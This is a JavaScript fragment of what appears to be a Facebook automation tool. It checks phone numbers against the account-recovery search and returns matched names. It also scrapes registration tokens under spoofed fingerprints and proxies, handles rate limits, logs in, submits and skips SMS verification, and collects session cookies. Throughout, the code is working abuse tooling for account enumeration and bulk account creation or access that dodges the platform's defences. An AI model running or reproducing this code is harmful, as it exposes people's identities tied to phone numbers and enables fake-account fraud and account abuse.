    fragments.push(decodeJsonEscapedStr(m[1]));
  }
  for (const m of raw.matchAll(/"(?:errorSummary|errorDescription|error_message|reg_error)"\s*:\s*"((?:\\.|[^"\\])*)"/g)) {
    fragments.push(decodeJsonEscapedStr(m[1]));
  }
  return fragments;
}

function extractVisibleText(html) {
  const raw = String(html || '');
  const bpFragments = extractBigPipeHtmlFragments(raw).join(' ');
  const domOnly = raw
    .replace(/<script[\s\S]*?<\/script>/gi, ' ')
    .replace(/<style[\s\S]*?<\/style>/gi, ' ');
  return `${domOnly} ${bpFragments}`
    .replace(/<[^>]+>/g, ' ')
    .replace(/&nbsp;|&#160;/gi, ' ')
    .replace(/&#0*39;|&apos;/gi, "'")
    .replace(/&quot;/gi, '"')
    .replace(/&amp;/gi, '&')
    .replace(/\s+/g, ' ')
    .trim();
}

function isRealNavigationUri(uri) {
  const u = String(uri || '').trim();
  if (!u || u.length > 500) return false;
  if (/^https?:\/\/static\.xx\.fbcdn\.net/i.test(u) || /\.(?:js|css|png|jpg|webp|svg|woff2?)(?:\?|$)/i.test(u)) {
    return false;
  }
  return true;
}

function extractFbResponseSignals(rawBody) {
  const raw = String(rawBody || '');
  const chunks = parseJsonStreamObjects(raw);
  const errTexts = [];
  const redirectUris = [];
  const htmlFragments = extractBigPipeHtmlFragments(raw);

  for (const ch of chunks) collectStringsAndUris(ch, errTexts, redirectUris);

  // Extract explicit redirect / navigation calls inside BigPipe JS (goURI, redirect_uri, etc.)
  for (const m of raw.matchAll(/"(?:redirect_uri|redirectUri|redirect)"\s*:\s*"([^"]+)"/gi)) {
    const u = decodeJsonEscapedStr(m[1]).trim();
    if (isRealNavigationUri(u)) redirectUris.push(u);
  }
  for (const m of raw.matchAll(/(?:goURI|URI\.redirect)\(\s*["']([^"']+)["']/gi)) {
    const u = decodeJsonEscapedStr(m[1]).trim();
    if (isRealNavigationUri(u)) redirectUris.push(u);
  }

  // Extract visible error elements from DOM or BigPipe __html fragments
  const combinedHtml = `${raw.replace(/<script[\s\S]*?<\/script>/gi, ' ')}\n${htmlFragments.join('\n')}`;
  for (const m of combinedHtml.matchAll(/class="[^"]*(?:error|_5s6c|_585n|mfsm|uiBoxRed)[^"]*"[^>]*>([\s\S]*?)<\/div>/gi)) {
    const t = m[1].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
    if (t.length > 4 && t.length < 280) errTexts.push(t);
  }

  // Explicit JSON errorSummary/errorDescription pairs
  for (const m of raw.matchAll(/"(?:errorSummary|errorDescription|error_message)"\s*:\s*"((?:\\.|[^"\\])*)"/g)) {
    const t = decodeJsonEscapedStr(m[1]).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
    if (t.length > 3) errTexts.push(t);
  }

  return {
    errTexts: Array.from(new Set(errTexts)),
    redirectUris: Array.from(new Set(redirectUris.filter(isRealNavigationUri))),
    decodedHtml: combinedHtml,
    visibleText: extractVisibleText(raw),
  };
}

function parseJsonStreamObjects(rawText) {
  const objs = [];
  const raw = String(rawText || '').trim();
  if (!raw) return objs;
  for (const line of raw.split(/\r?\n/)) {
    const clean = line.trim().replace(/^for\s*\(\s*;\s*;\s*\)\s*;?/, '').trim();
    if (!clean || (clean[0] !== '{' && clean[0] !== '[')) continue;
    try {
      const parsed = JSON.parse(clean);
      if (parsed && typeof parsed === 'object') objs.push(parsed);
    } catch {
      // ignore non-json chunk
    }
  }
  if (objs.length === 0) {
    const cleanAll = raw.replace(/^for\s*\(\s*;\s*;\s*\)\s*;?/, '').trim();
    if (cleanAll.startsWith('{') || cleanAll.startsWith('[')) {
      try {
        const parsed = JSON.parse(cleanAll);
        if (parsed && typeof parsed === 'object') objs.push(parsed);
      } catch {
        // ignore
      }
    }
  }
  return objs;
}

function collectStringsAndUris(obj, errorsOut = [], urisOut = [], depth = 0) {
  if (!obj || depth > 8) return;
  if (Array.isArray(obj)) {
    for (const item of obj) collectStringsAndUris(item, errorsOut, urisOut, depth + 1);
    return;
  }
  if (typeof obj !== 'object') return;
  for (const [k, v] of Object.entries(obj)) {
    const lk = k.toLowerCase();
    if (typeof v === 'string') {
      if (
        ['errorsummary', 'errordescription', 'error_message', 'error', 'message', 'msg', 'notice'].includes(lk) &&
        v.trim().length > 3
      ) {
        errorsOut.push(decodeJsonEscapedStr(v).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());
      }
      if (['redirect', 'redirect_uri', 'redirecturi', 'next'].includes(lk) && v.trim()) {
        const cleanU = decodeJsonEscapedStr(v).trim();
        if (isRealNavigationUri(cleanU)) urisOut.push(cleanU);
      }
    } else if (v && typeof v === 'object') {
      collectStringsAndUris(v, errorsOut, urisOut, depth + 1);
    }
  }
}

const GQL_NO_ACCOUNT_PATTERNS = [
  'no account found',
  'hakuna akaunti',
  'aucun compte',
  'no se encontr',
  'ninguna cuenta',
  'tidak ditemukan',
  'tiada akaun',
  'account not found',
  "couldn't find your account",
  'কোনো অ্যাকাউন্ট',
  'لم يتم العثور على',
  'कोई खाता नहीं',
  'tidak ada akun',
  'nenhuma conta',
];

let gqlSessionCache = null;
let gqlHarvestInflight = null;

async function harvestGqlSessionDirect(forceRefresh = false, opts = {}) {
  const now = Date.now();
  const isIsolated = Boolean(forceRefresh || opts.proxy);
  if (!isIsolated && gqlSessionCache && now - gqlSessionCache.fetchedAt < 8 * 60 * 1000 && gqlSessionCache.lsd) {
    return gqlSessionCache;
  }
  if (!isIsolated && gqlHarvestInflight) {
    return gqlHarvestInflight;
  }

  const runHarvest = async () => {
    const jar = {};
    try {
      const res = await fetchWithJar('https://www.facebook.com/login/identify/', jar, {
        preferCurl: true,
        proxy: opts.proxy || null,
        strictProxy: opts.strictProxy !== false,
        timeoutMs: opts.timeoutMs || 12000,
        ua: DESKTOP_UA,
        headers: {
          Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'none',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1',
        },
        shouldAbort: opts.shouldAbort,
      });
      const html = res.text || '';
      const lsd =
        html.match(/"LSD",\[\],\{"token":"([^"]+)"/)?.[1] ||
        html.match(/name=["']lsd["'][^>]*value=["']([^"']+)["']/i)?.[1] ||
        tok(html, 'lsd') ||
        DEFAULT_FB_LSD;
      const rev =
        html.match(/"client_revision":(\d+)/)?.[1] ||
        html.match(/"server_revision":(\d+)/)?.[1] ||
        html.match(/"__rev":(\d+)/)?.[1] ||
        '1055852612';
      const spinT = html.match(/"__spin_t":(\d+)/)?.[1] || String(Math.floor(Date.now() / 1000));
      const spinB = html.match(/"__spin_b":"([^"]+)"/)?.[1] || 'trunk';
      const hsi = html.match(/"hsi":"([^"]+)"/)?.[1] || '';

      const session = {
        lsd,
        jazoest: jazoest(lsd) || DEFAULT_GQL_JAZOEST,
        datr: jar.datr || '',
        jar,
        rev,
        spinT,
        spinB,
        hsi,
        ua: DESKTOP_UA,
        fetchedAt: Date.now(),
      };
      if (!isIsolated && lsd && lsd !== DEFAULT_FB_LSD) {
        gqlSessionCache = session;
      }
      return session;
    } catch {
      return {
        lsd: DEFAULT_FB_LSD,
        jazoest: DEFAULT_GQL_JAZOEST,
        datr: '',
        jar: {},
        rev: '1055852612',
        spinT: String(Math.floor(Date.now() / 1000)),
        spinB: 'trunk',
        hsi: '',
        ua: DESKTOP_UA,
        fetchedAt: Date.now(),
      };
    }
  };

  if (isIsolated) {
    return await runHarvest();
  }

  gqlHarvestInflight = (async () => {
    try {
      return await runHarvest();
    } finally {
      gqlHarvestInflight = null;
    }
  })();

  return gqlHarvestInflight;
}

async function checkNumberGraphql(phoneNumber, opts = {}) {
  const numStr = String(phoneNumber || '').trim().startsWith('+')
    ? String(phoneNumber).trim()
    : `+${String(phoneNumber || '').replace(/\D/g, '')}`;
  const digits = numStr.replace(/\D/g, '');
  if (!digits) return { status: 'unknown', nameHint: '', reason: 'invalid phone' };

  const sess = opts.lsd
    ? {
        lsd: opts.lsd,
        jazoest: jazoest(opts.lsd) || DEFAULT_GQL_JAZOEST,
        jar: opts.jar ? { ...opts.jar } : {},
        rev: opts.rev || '1055852612',
        spinT: String(Math.floor(Date.now() / 1000)),
        spinB: 'trunk',
        hsi: opts.hsi || '',
        ua: DESKTOP_UA,
      }
    : await harvestGqlSessionDirect(Boolean(opts.forceRefreshSession), {
        proxy: opts.proxy || null,
        strictProxy: opts.strictProxy !== false,
        timeoutMs: Math.min(opts.timeoutMs || 12000, 12000),
        shouldAbort: opts.shouldAbort,
      });

  const lsd = sess.lsd || DEFAULT_FB_LSD;
  const hdrs = {
    'User-Agent': sess.ua || DESKTOP_UA,
    Accept: '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Content-Type': 'application/x-www-form-urlencoded',
    'x-fb-friendly-name': 'CAAFBAccountSearchViewQuery',
    'x-asbd-id': '359341',
    'x-fb-lsd': lsd,
    origin: 'https://www.facebook.com',
    referer: 'https://www.facebook.com/login/identify/',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
  };
  const variables = {
    params: {
      cipher_text: DEFAULT_GQL_CIPHER,
      context: 'recover',
      event_request_id: crypto.randomUUID(),
      friend_name: '',
      search_query: numStr,
      waterfall_id: crypto.randomUUID(),
    },
  };
  const payload = new URLSearchParams({
    av: '0',
    __aaid: '0',
    __user: '0',
    __a: '1',
    __req: '5',
    __hs: sess.hsi || '',
    dpr: '1',
    __ccg: 'EXCELLENT',
    __rev: sess.rev || '1055852612',
    __comet_req: '15',
    lsd,
    jazoest: sess.jazoest || jazoest(lsd) || DEFAULT_GQL_JAZOEST,
    __spin_r: sess.rev || '1055852612',
    __spin_b: sess.spinB || 'trunk',
    __spin_t: sess.spinT || String(Math.floor(Date.now() / 1000)),
    fb_api_caller_class: 'RelayModern',
    fb_api_req_friendly_name: 'CAAFBAccountSearchViewQuery',
    server_timestamps: 'true',
    variables: JSON.stringify(variables),
    doc_id: DEFAULT_GQL_DOC_ID,
  }).toString();

  const jar = { ...(sess.jar || {}) };
  try {
    const res = await fetchWithJar(FB_GRAPHQL_URL, jar, {
      preferCurl: true,
      method: 'POST',
      headers: hdrs,
      body: payload,
      ua: sess.ua || DESKTOP_UA,
      timeoutMs: opts.timeoutMs || 15000,
      proxy: opts.proxy || null,
      strictProxy: opts.strictProxy !== false,
      shouldAbort: opts.shouldAbort,
    });
    if (res.status !== 200) {
      const isRl = res.status === 429;
      return { status: isRl ? 'ratelimit' : 'unknown', nameHint: '', reason: `HTTP ${res.status}` };
    }
    const clean = (res.text || '').trim().replace(/^for\s*\(\s*;\s*;\s*\)\s*;?/, '');
    const js = JSON.parse(clean);
    if (js?.error) {
      if ((js.error === 1357054 || js.error === 1357004) && !opts._retriedSession && !opts.lsd) {
        gqlSessionCache = null;
        return checkNumberGraphql(phoneNumber, { ...opts, forceRefreshSession: true, _retriedSession: true });
      }
      const errMsg = js.errorSummary || js.errorDescription || `FB Err ${js.error}`;
      const isRl = js.error === 1675004 || /too many|rate limit|try again|blocked|temporarily|slow down/i.test(errMsg);
      return {
        status: isRl ? 'ratelimit' : 'unknown',
        nameHint: '',
        reason: errMsg,
      };
    }
    const search = js?.data?.caa_ar_fb_account_search || {};
    const accounts = Array.isArray(search.accounts) ? search.accounts : [];
    const desc = String(search?.error_content?.description || '').trim();
    const descLow = desc.toLowerCase();
    const errStyle = String(search?.error_style || '').toUpperCase();

    if (accounts.length > 0) {
      const hint = String(accounts[0]?.name || '').trim();
      return {
        status: 'taken',
        nameHint: hint,
        reason: `Found ${accounts.length} account(s)`,
        redirectUri: String(search.redirect_uri || ''),
        gqlJar: jar,
      };
    }
    if (
      GQL_NO_ACCOUNT_PATTERNS.some((p) => descLow.includes(p)) ||
      (errStyle === 'INLINE_IDENTIFIER' && !search.redirect_uri && search.num_results_shown === 0)
    ) {
      return { status: 'free', nameHint: '', reason: 'No account found' };
    }
    if (search.redirect_uri && /\/recover/i.test(String(search.redirect_uri))) {
      return {
        status: 'taken',
        nameHint: '',
        reason: 'Recovery match found',
        redirectUri: String(search.redirect_uri),
        gqlJar: jar,
      };
    }
    if (/too many|rate limit|try again|blocked|temporarily|slow down/i.test(descLow)) {
      return { status: 'ratelimit', nameHint: '', reason: desc.slice(0, 80) };
    }
    if (desc) {
      return { status: 'unknown', nameHint: '', reason: desc.slice(0, 80) };
    }
    return { status: 'unknown', nameHint: '', reason: 'Unrecognized GraphQL response' };
  } catch (err) {
    if (err && err.isProxyError) throw err;
    return {
      status: 'unknown',
      nameHint: '',
      reason: err instanceof Error ? err.message : 'GraphQL failed',
    };
  }
}

async function harvestTokens(cfg, jar, trace, proxy, opts = {}) {
  const timeoutMs = (cfg.timeout || 18) * 1000;
  const px = proxy !== undefined ? proxy : cfg.proxy;
  const strictProxy = cfg.strict_proxy !== false;
  const fp = opts.fp || buildFingerprint(cfg.cc);
  const proxySaver = cfg.proxy_saver !== false && !opts.forceWarmup;
  if (!proxySaver) {
    try {
      await fetchWithJar('https://www.facebook.com/', jar, {
        timeoutMs: Math.min(timeoutMs, 8000),
        proxy: px,
        strictProxy,
        ua: fp.ua,
        headers: { ...fp.headers, 'sec-fetch-site': 'none' },
        shouldAbort: opts.shouldAbort,
      });
    } catch (err) {
      if (err && err.isProxyError) {
        trace.push(`proxy err: ${err.message}`);
        throw err;
      }
    }
  } else if (px) {
    proxyTrafficStats.savedWarmups += 1;
  }

  const hosts = [
    [`${FB_REG_BASE}/reg/?cid=103&refsrc=deprecated&soft=hjk`, 'https://www.facebook.com/', fp.ua, fp.headers],
    ['https://www.facebook.com/r.php?locale=en_US', 'https://www.facebook.com/', DESKTOP_UA, { 'User-Agent': DESKTOP_UA }],
    ['https://m.facebook.com/reg/?cid=103&refid=8', 'https://m.facebook.com/', fp.ua, fp.headers],
  ];

  let fallbackToken = null;

  for (const [url, ref, ua, hdrs] of hosts) {
    if (opts.shouldAbort && opts.shouldAbort()) break;
    const host = new URL(url).host;
    try {
      const r = await fetchWithJar(url, jar, {
        headers: { ...hdrs, Referer: ref },
        timeoutMs: Math.min(timeoutMs, 12000),
        proxy: px,
        strictProxy,
        ua,
        shouldAbort: opts.shouldAbort,
      });
      const html = r.text || '';
      const redirectedIg = (r.url || '').includes('/ig/login_via/');
      const isLimited = host === 'limited.facebook.com';
      const isCometSpa =
        !isLimited &&
        !html.includes('reg_email__') &&
        (html.includes('CAARegistrationFormDesktop') || html.includes('CAAFBRegistrationHomepageRoot'));
      trace.push(`reg ${r.status}/${html.length}B (${host}${redirectedIg ? '->ig' : isCometSpa ? '->comet' : ''})`);
      const { action, inputs, selects } = readForm(html, 'reg');

      const lsd = inputs.lsd?.[1] || tok(html, 'lsd');
      const xrTokens = fromXrefCookie(jar);
      const xref = decodeURIComponent(jar['x-referer'] || '');
      const blob = `${html}\n${decodeURIComponent(r.url || '')}\n${action || ''}\n${xref}`;

      const etok =
        inputs.e_token?.[1] ||
        tok(html, 'e_token') ||
        xrTokens.etok ||
        (blob.match(/(?:^|[^a-zA-Z0-9_])e_token[=":\s]+([A-Za-z0-9_\-]{6,})/)?.[1] ?? '');
      const dhash =
        inputs.d_hash?.[1] ||
        tok(html, 'd_hash') ||
        xrTokens.dhash ||
        (blob.match(/(?:^|[^a-zA-Z0-9_])d_hash[=":\s]+([A-Za-z0-9_\-]{6,})/)?.[1] ?? '');
      const cid =
        inputs.cid?.[1] ||
        tok(html, 'cid') ||
        xrTokens.cid ||
        (blob.match(/cid=(\d+)/)?.[1] ?? '103');
      const regInstance =
        inputs.reg_instance?.[1] ||
        (blob.match(/"reg_instance"\s*:\s*"([A-Za-z0-9_\-]+)"/)?.[1] ?? '');

      const base = `https://${host}`;
      const q = [];
      if (etok) q.push('e_token=' + etok);
      if (dhash) q.push('d_hash=' + dhash);
      if (cid) q.push('cid=' + cid);
      q.push('app_version=310', 'tg=201', 'cct=0', 'src=0', 'soft=hjk');
      const qs = '?' + q.join('&');

      const acts = [];
      if (isLimited) {
        acts.push(`${FB_REG_BASE}/reg/submit/?app_id=103&multi_step_form=1&skip_suma=0&shouldForceMTouch=1`);
      } else {
        if (action) acts.push(action.startsWith('http') ? action : new URL(action, base).toString());
        acts.push(`${base}/reg/submit/${qs}`, `${base}/mreg/submit/${qs}`);
      }

      const candidate = {
        inputs,
        selects,
        actions: Array.from(new Set(acts)),
        base,
        lsd,
        etok,
        dhash,
        cid,
        regInstance,
        ua,
        fp,
        src: url,
        qs,
        isLimited,
        hasClassicForm: html.includes('reg_email__'),
        isCometSpa,
      };

      if (isLimited && r.status < 400 && lsd) {
        trace.push(`limited lsd=${lsd.slice(0, 8)} fp=${fp.model}`);
        return candidate;
      }
      if (html.includes('reg_email__') || (r.status < 400 && !redirectedIg && (regInstance || etok) && lsd)) {
        trace.push(`tok e=${etok ? 'y' : 'n'} d=${dhash ? 'y' : 'n'} ri=${regInstance ? 'y' : 'n'} f=${Object.keys(inputs).length}`);
        return candidate;
      }
      if (!fallbackToken && r.status < 400 && (lsd || etok)) {
        fallbackToken = candidate;
      }
    } catch (err) {
      if (err && err.isProxyError) {
        trace.push(`get ${host} ${err.message}`);
        throw err;
      }
      trace.push(`get ${host} ${err instanceof Error ? err.name : 'Err'}`);
    }
  }
  if (fallbackToken) {
    trace.push(`tok-fallback lsd=${fallbackToken.lsd ? 'y' : 'n'} e=${fallbackToken.etok ? 'y' : 'n'}`);
    return fallbackToken;
  }
  return null;
}

async function trySkip(jar, html, base, timeoutMs, proxy, fp = null) {
  const hdrs = fp ? fp.headers : undefined;
  const ua = fp ? fp.ua : LITE_UA;
  const linkMatches = (html || '').matchAll(/<a[^>]+href=["']([^"']+)["'][^>]*>([\s\S]*?)<\/a>/gi);
  for (const m of linkMatches) {
    const rawUrl = (m[1] || '').replace(/&amp;/g, '&');
    const txt = (m[2] || '').replace(/<[^>]+>/g, ' ').trim().toLowerCase();
    if (!SKIP_HINTS.some((h) => txt.includes(h))) continue;
    try {
      const target = new URL(rawUrl, base).toString();
      await fetchWithJar(target, jar, { timeoutMs, proxy, ua, headers: hdrs });
      if (jar.c_user) return true;
    } catch {
      // continue
    }
  }

  const formMatches = (html || '').matchAll(/<form[^>]*>[\s\S]*?<\/form>/gi);
  for (const fm of formMatches) {
    const block = fm[0];
    if (!/name=["'](skip|not_now|action)["']/i.test(block)) continue;
    const parsed = readForm(block, 'otp');
    if (!parsed.action) continue;
    try {
      const target = new URL(parsed.action, base).toString();
      const data = {};
      for (const [k, v] of Object.entries(parsed.inputs)) {
        data[k] = v[1];
      }
      if (!data.skip) data.skip = '1';
      await fetchWithJar(target, jar, {
        method: 'POST',
        body: new URLSearchParams(data).toString(),
        timeoutMs,
        proxy,
        ua,
        headers: { ...(hdrs || {}), 'Content-Type': 'application/x-www-form-urlencoded' },
      });
      if (jar.c_user) return true;
    } catch {
      // continue
    }
  }
  return false;
}

function extractUidFromHtml(html, url = '') {
  const mUrl = String(url || '').match(/[?&]id=(\d{6,})/);
  if (mUrl) return mUrl[1];
  const mCookie = String(html || '').match(/"c_user"\s*:\s*"?(\d{6,})"?/);
  if (mCookie && mCookie[1] !== '0') return mCookie[1];
  const mJson = String(html || '').match(/"USER_ID"\s*:\s*"(\d{6,})"/);
  if (mJson && mJson[1] !== '0') return mJson[1];
  return '';
}

async function resolveUid(jar, cfg, proxy, fp = null) {
  if (jar.c_user) return jar.c_user;
  const timeoutMs = (cfg.timeout || 35) * 1000;
  const uaMob = fp?.ua || LITE_UA;
  for (const [probeUrl, ua] of [
    [`${FB_REG_BASE}/profile.php`, uaMob],
    ['https://mbasic.facebook.com/profile.php', uaMob],
    ['https://www.facebook.com/me', DESKTOP_UA],
  ]) {
    try {
      const r = await fetchWithJar(probeUrl, jar, {
        timeoutMs,
        proxy,
        strictProxy: cfg.strict_proxy !== false,
        ua,
        headers: fp ? fp.headers : undefined,
      });
      if (jar.c_user) return jar.c_user;
      const uid = extractUidFromHtml(r.text, r.url);
      if (uid) {
        jar.c_user = uid;
        return uid;
      }
    } catch {
      // continue
    }
  }
  return '';
}

async function loginUid(phone, pw, cfg, jar, proxy, fp = null) {
  if (!phone || !pw) {
    return resolveUid(jar, cfg, proxy, fp);
  }
  const timeoutMs = (cfg.timeout || 35) * 1000;
  const strictProxy = cfg.strict_proxy !== false;
  const targets = [
    ['https://m.facebook.com/login/', 'https://m.facebook.com', fp?.ua || LITE_UA],
    ['https://www.facebook.com/login/', 'https://www.facebook.com', DESKTOP_UA],
  ];
  for (const [loginUrl, origin, ua] of targets) {
    try {
      const r = await fetchWithJar(loginUrl, jar, { timeoutMs, proxy, strictProxy, ua });
      const html = r.text || '';
      if ((r.url || '').includes('/unified/login_via/') && !html.includes('name="email"')) {
        continue;
      }
      const lsd = tok(html, 'lsd');
      const parsed = readForm(html, 'reg');
      const data = { email: phone, pass: pw, login: 'Log In' };
      if (lsd) {
        data.lsd = lsd;
        data.jazoest = jazoest(lsd);
      }
      for (const [k, [typ, val]] of Object.entries(parsed.inputs)) {
        if (typ === 'hidden' && !(k in data)) data[k] = val;
      }
      const act =
        parsed.action ||
        (origin.includes('www.')
          ? '/login/device-based/regular/login/?login_attempt=1'
          : '/login/device-based/regular/login/');
      const postUrl = new URL(act, origin).toString();
      const postRes = await fetchWithJar(postUrl, jar, {
        method: 'POST',
        body: new URLSearchParams(data).toString(),
        timeoutMs,
        proxy,
        strictProxy,
        ua,
        headers: {
          Referer: r.url || loginUrl,
          Origin: origin,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
      if (jar.c_user) return jar.c_user;
      const uidFromPost = extractUidFromHtml(postRes.text, postRes.url);
      if (uidFromPost) {
        jar.c_user = uidFromPost;
        return uidFromPost;
      }
    } catch {
      // try next target
    }
  }
  return resolveUid(jar, cfg, proxy, fp);
}

async function performOtpConfirm(item, code, cfg, baseCookieOverride) {
  const baseJar = parseCookieHeader(baseCookieOverride || '');
  const jar = { ...baseJar, ...(item.cookies || {}) };
  let px = (item.proxy || cfg.proxy || '').trim() || null;
  const strictProxy = cfg.strict_proxy !== false;
  const ua = item.ua || LITE_UA;
  let confirmUrl = item.confirm_url || `${FB_REG_BASE}/confirmphone.php`;
  let act = item.action || '';
  let flds = { ...(item.fields || {}) };
  const timeoutMs = ((cfg.timeout || 35) + 5) * 1000;

  const safeConfirmFetch = async (url, fOpts = {}) => {
    try {
      return await fetchWithJar(url, jar, { ...fOpts, timeoutMs, proxy: px, strictProxy, ua });
    } catch (err) {
      if (err && err.isProxyError && /407/.test(err.message || '') && cfg.proxy && px !== cfg.proxy) {
        dynamicProxyTagBlacklist.add(proxyHealthKey(cfg.proxy));
        px = cfg.proxy;
        item.proxy = cfg.proxy;
        return await fetchWithJar(url, jar, { ...fOpts, timeoutMs, proxy: px, strictProxy, ua });
      }
      throw err;
    }
  };

  if (!act && /\/reg\/submit\//i.test(confirmUrl) && !jar.c_user) {
    return { status: 'FAIL', err: 'Incomplete/failed signup session (no real Facebook confirm form)' };
  }

  if (!act) {
    try {
      const r = await safeConfirmFetch(confirmUrl);
      confirmUrl = r.url || confirmUrl;
      const parsed = readForm(r.text || '', 'otp');
      act = parsed.action;
      flds = Object.fromEntries(Object.entries(parsed.inputs).map(([k, v]) => [k, v[1]]));
      if (!act && (confirmUrl.includes('/unified/login_via/') || confirmUrl.includes('/login'))) {
        return { status: 'FAIL', err: 'Session expired or not logged in for OTP confirmation' };
      }
    } catch (err) {
      return { status: 'FAIL', err: err instanceof Error ? err.message : 'Network error' };
    }
  }

  if (!act || /\/reg\/submit\//i.test(act)) {
    return { status: 'FAIL', err: 'no confirm form' };
  }

  let resolvedAct;
  let baseOrigin;
  try {
    resolvedAct = new URL(act, confirmUrl).toString();
    baseOrigin = new URL(resolvedAct).origin;
  } catch {
    return { status: 'FAIL', err: 'Invalid confirm form action URL' };
  }
  const fld = OTP_FIELDS.find((k) => k in flds) || 'code';
  if (code) {
    flds[fld] = code;
  }

  let r;
  try {
    r = await safeConfirmFetch(resolvedAct, {
      method: 'POST',
      body: new URLSearchParams(flds).toString(),
      headers: {
        Referer: confirmUrl,
        Origin: baseOrigin,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
  } catch (err) {
    return { status: 'FAIL', err: err instanceof Error ? err.message : 'Post failed' };
  }

  const body = r.text || '';
  const visibleLow = extractVisibleText(body).toLowerCase();
  if (jar.c_user && jar.xs) {
    return { status: 'OK', uid: jar.c_user, cookies: orderCookies(jar) };
  }
  const directUid = extractUidFromHtml(body, r.url);
  if (directUid && jar.xs) {
    jar.c_user = directUid;
    return { status: 'OK', uid: directUid, cookies: orderCookies(jar) };
  }
  if (WRONG_CODE_WORDS.some((w) => visibleLow.includes(w))) {
    return { status: 'WRONG' };
  }

  if (cfg.skip_probe) {
    const skippedOk = await trySkip(jar, body, baseOrigin, timeoutMs, px);
    if (skippedOk && jar.c_user) {
      return { status: 'OK', uid: jar.c_user, cookies: orderCookies(jar) };
    }
  }

  const nextForm = readForm(body, 'otp');
  if (
    nextForm.action &&
    !/\/reg\/submit\//i.test(nextForm.action) &&
    (nextForm.action.toLowerCase().includes('confirm') || (r.url || '').toLowerCase().includes('checkpoint'))
  ) {
    item.action = nextForm.action;
    item.fields = Object.fromEntries(Object.entries(nextForm.inputs).map(([k, v]) => [k, v[1]]));
    item.cookies = orderCookies(jar);
    item.confirm_url = r.url || confirmUrl;
    return { status: 'RETRY', item };
  }
  if ((r.url || '').toLowerCase().includes('/checkpoint')) {
    item.cookies = orderCookies(jar);
    item.confirm_url = r.url || confirmUrl;
    return { status: 'RETRY', item };
  }

  const resolved = await resolveUid(jar, cfg, px);
  if (resolved) {
    return { status: 'OK', uid: resolved, cookies: orderCookies(jar) };
  }

  return { status: 'FAIL', err: 'confirm rejected' };
}

function decodeHtmlAttrs(s) {
  return String(s || '')
    .replace(/&amp;/gi, '&')
    .replace(/&quot;/gi, '"')
    .replace(/&#0*39;|&apos;/gi, "'")
    .replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>');
}

function extractOtpResendTargets(html, baseUrl) {
  const signals = extractFbResponseSignals(html || '');
  const fullHtml = `${String(html || '')}\n${signals.decodedHtml || ''}`;
  const seenUrls = new Set();
  const seenForms = new Set();
  const links = [];
  const forms = [];
  const hasOtpInput = OTP_FIELDS.some((f) => new RegExp(`name=["']${f}["']`, 'i').test(fullHtml));

  const badTargetRe = /\b(voice|call|phone_call|whatsapp|change_contact|change_number|edit_phone|update_phone|logout|cancel|sign\s*out|use\s*email)\b/i;
  const resendHrefRe = /(?:confirm(?:phone|email|_code)?\/(?:resend|send)|recover\/code\/[^"']*resend|ajax\/recover\/code|resend_code|resend_sms|resend_otp|send_again|send_another|send_code_again|send_sms|send_otp|confirmphone\.php[^"']*(?:resend|send)|[?&](?:resend|is_resend|send_again|action)=(?:1|true|resend))/i;
  const resendTextRe = /(?:resend|send\s+(?:the\s+)?(?:code|sms|otp)\s*again|send\s+(?:a\s+)?(?:new|another)\s+(?:code|sms|otp)|get\s+(?:a\s+)?(?:new|another)\s+(?:code|sms|otp)|another\s+code|request\s+(?:a\s+)?new\s+code|send\s+(?:code\s+)?via\s+sms|send\s+sms\s+again|send\s+by\s+sms|text\s+me(?:\s+a\s+code)?|didn['’]t\s+(?:get|receive)|haven['’]t\s+received|try\s+another\s+way)/i;
  const initialSmsTextRe = /(?:send\s+(?:sms|code|otp)|get\s+code|text\s+me|receive\s+(?:sms|code)|continue)/i;

  const resolveSafe = (rawHref) => {
    const clean = decodeHtmlAttrs(rawHref).trim();
    if (!clean || clean.startsWith('#') || /^(?:javascript|mailto|tel):/i.test(clean)) return '';
    try {
      return new URL(clean, baseUrl).toString();
    } catch {
      return '';
    }
  };

  for (const m of fullHtml.matchAll(/<a\b[^>]*href=["']([^"']+)["'][^>]*>([\s\S]*?)<\/a>/gi)) {
    const url = resolveSafe(m[1]);
    if (!url) continue;
    const text = decodeHtmlAttrs(m[2].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());
    if (badTargetRe.test(url) || badTargetRe.test(text)) continue;
    const hrefMatch = resendHrefRe.test(url);
    const textMatch = resendTextRe.test(text);
    const initMatch = !hasOtpInput && initialSmsTextRe.test(text) && /confirm|checkpoint|recover/i.test(url);
    if (hrefMatch || textMatch || initMatch) {
      if (!seenUrls.has(url)) {
        seenUrls.add(url);
        links.push({
          url,
          label: text || 'Resend link',
          score: (hrefMatch ? 3 : 0) + (textMatch ? 2 : 0) + (initMatch ? 1 : 0),
        });
      }
    }
  }

  // Also check ajaxify / data-href / data-uri attributes used on mobile touch buttons/anchors
  for (const m of fullHtml.matchAll(/\b(?:ajaxify|data-ajaxify|data-href|data-uri)=["']([^"']+)["']/gi)) {
    const url = resolveSafe(m[1]);
    if (!url || badTargetRe.test(url)) continue;
    if (resendHrefRe.test(url) && !seenUrls.has(url)) {
      seenUrls.add(url);
      links.push({ url, label: 'Mobile resend endpoint', score: 3 });
    }
  }

  // Also scan decoded JSON/BigPipe payloads for confirm/resend endpoints
  for (const m of fullHtml.matchAll(/["']((?:https?:\/\/[^"'\s]+|\/[^"'\s]*)(?:confirm(?:phone|email|_code)?\/resend|resend_code|resend_sms|send_code_again)[^"'\s]*)["']/gi)) {
    const url = resolveSafe(m[1]);
    if (!url || badTargetRe.test(url)) continue;
    if (!seenUrls.has(url)) {
      seenUrls.add(url);
      links.push({ url, label: 'JSON resend endpoint', score: 3 });
    }
  }

  for (const uri of signals.redirectUris || []) {
    if (resendHrefRe.test(uri) && !badTargetRe.test(uri)) {
